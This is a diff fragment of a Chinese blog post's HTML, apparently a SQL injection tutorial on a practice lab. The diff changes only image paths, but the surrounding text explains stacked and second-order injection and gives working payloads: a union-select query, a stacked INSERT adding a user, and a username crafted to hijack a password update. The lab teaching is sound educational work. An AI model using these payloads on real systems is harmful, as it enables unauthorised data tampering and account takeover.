@@ -260,11 +260,11 @@
 <h1 id="4-堆叠注入"><a href="#4-堆叠注入" class="headerlink" title="4. 堆叠注入"></a>4. 堆叠注入</h1><p>在SQL中，<code>;</code> 是用来表示一条 sql 语句的结束，在结束一个sql语句后继续构造下一条语句，两条 sql 语句一起执行就造就了堆叠注入。</p>
 <p>查询用户数：<code>?id=-1&#39;union select 1,(select count(username) from users),3 --+</code></p>
 <p>显示有十四条数据：</p>
-<p><img src="/./Relearn-sql-injection/4-1.png"></p>
+<p><img src="/2023/02/18/Relearn-sql-injection/4-1.png"></p>
 <p>堆叠注入：<code>?id=1&#39;;insert into users(id,username,password) values (&#39;40&#39;,&#39;less39&#39;,&#39;hello&#39;) --+</code></p>
 <p>查询用户数：<code>?id=-1&#39;union select 1,(select count(username) from users),3 --+</code></p>
 <p>显示有十八条数据：</p>
-<p><img src="/./Relearn-sql-injection/4-2.png"></p>
+<p><img src="/2023/02/18/Relearn-sql-injection/4-2.png"></p>
 <h1 id="5-二次注入"><a href="#5-二次注入" class="headerlink" title="5. 二次注入"></a>5. 二次注入</h1><p>第一阶段：将想要利用的特殊字符（’ 、” 、#）通过正当逻辑，写入到数据库中<br>第二阶段：通过正常逻辑调用写入的特殊字符</p>
 <p>插入注册qq’#用户时可以成功注册</p>
 <p>修改密码 sql语句可能为：<code>update users set password=&#39;$new_password&#39; where username=&#39;qq&#39;#&#39; and password=&#39;$old_password&#39; ;</code></p>
